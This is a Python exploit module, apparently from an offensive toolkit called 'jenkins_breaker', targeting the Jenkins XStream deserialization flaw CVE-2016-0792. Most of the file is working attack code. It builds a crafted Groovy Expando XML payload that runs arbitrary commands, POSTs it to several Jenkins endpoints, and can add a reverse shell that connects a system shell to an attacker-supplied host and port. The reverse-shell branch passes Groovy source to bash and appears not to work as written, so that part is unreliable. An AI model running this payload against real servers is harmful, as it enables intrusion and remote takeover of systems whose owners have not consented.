"""
CVE-2016-0792: Jenkins XStream Deserialization RCE

This exploit leverages unsafe XStream deserialization of groovy.util.Expando objects
in Jenkins versions before 1.650 (LTS before 1.642.2) to achieve remote code execution.
"""

from typing import Any

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2016_0792(ExploitModule):
    """Jenkins XStream deserialization vulnerability for RCE."""

    CVE_ID = "CVE-2016-0792"

    METADATA = ExploitMetadata(
        cve_id="CVE-2016-0792",
        name="Jenkins XStream Deserialization RCE",
        description="Remote code execution via unsafe XStream deserialization of Groovy Expando objects",
        affected_versions=["Jenkins < 1.650", "LTS < 1.642.2"],
        mitre_attack=["T1190", "T1059.006", "T1203"],
        severity="critical",
        references=[
            "https://www.jenkins.io/security/advisory/2016-02-24/",
            "https://nvd.nist.gov/vuln/detail/CVE-2016-0792",
            "https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_xstream_deserialize",
            "https://github.com/jpiechowka/jenkins-cve-2016-0792"
        ],
        requires_auth=True,
        requires_crumb=False,
        tags=["rce", "deserialization", "xstream", "groovy"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance is vulnerable.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/api/xml")
            return response.status_code == 200 and 'application/xml' in response.headers.get('Content-Type', '')
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2016-0792 for remote code execution.

        This uses XStream deserialization to execute arbitrary commands via
        groovy.util.Expando object injection.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
                - command (str): Command to execute (default: id)
                - lhost (str): Listener host for reverse shell
                - lport (int): Listener port for reverse shell

        Returns:
            ExploitResult: Result of the exploit
        """
        command = kwargs.get('command', 'id')
        lhost = kwargs.get('lhost')
        lport = kwargs.get('lport', 4444)

        if lhost:
            command = f"""
Thread.start{{
String host="{lhost}";
int port={lport};
Process p=new ProcessBuilder("/bin/sh","-i").redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){{try{{while(pi.available()>0)so.write(pi.read());while(si.available()>0){{int c=si.read();if(c==13)c=10;po.write(c);}}so.flush();po.flush();Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}}}}catch(Exception e){{}}}}p.destroy();s.close();
}}
""".strip()

        xstream_payload = f"""<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="groovy.util.Expando" reference="../../../.."/>
            <owner class="java.lang.ProcessBuilder">
              <command>
                <string>bash</string>
                <string>-c</string>
                <string>{command}</string>
              </command>
              <redirectErrorStream>false</redirectErrorStream>
            </owner>
            <resolveStrategy>0</resolveStrategy>
            <directive>0</directive>
            <parameterTypes/>
            <maximumNumberOfParameters>0</maximumNumberOfParameters>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>1</int>
  </entry>
</map>"""

        vulnerable_endpoints = [
            "/createItem?name=exploit",
            "/api/xml",
            "/computer/(master)/api/xml",
            "/view/All/api/xml",
        ]

        for endpoint in vulnerable_endpoints:
            try:
                response = session.post(
                    endpoint,
                    headers={"Content-Type": "application/xml"},
                    data=xstream_payload
                )

                if response.status_code in [200, 201, 500]:
                    if lhost:
                        return ExploitResult(
                            exploit=self.CVE_ID,
                            status="success",
                            details=f"Reverse shell payload sent to {lhost}:{lport}",
                            data={
                                "command": f"Reverse shell to {lhost}:{lport}",
                                "endpoint": endpoint,
                                "method": "XStream Groovy Expando deserialization",
                                "note": "Check your listener for incoming connection"
                            }
                        )
                    else:
                        return ExploitResult(
                            exploit=self.CVE_ID,
                            status="success",
                            details="Command execution payload delivered",
                            data={
                                "command": command,
                                "endpoint": endpoint,
                                "method": "XStream Groovy Expando deserialization",
                                "http_status": response.status_code,
                                "note": "Command executed blindly - no output returned"
                            }
                        )

            except Exception:
                continue

        return ExploitResult(
            exploit=self.CVE_ID,
            status="failure",
            details="XStream deserialization payload failed on all endpoints",
            error="All endpoints rejected the payload or target may be patched"
        )

    def cleanup(self, session: Any, **kwargs: Any) -> None:
        """
        Cleanup after exploitation.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
        """
        try:
            session.post("/job/exploit/doDelete")
        except Exception:
            pass
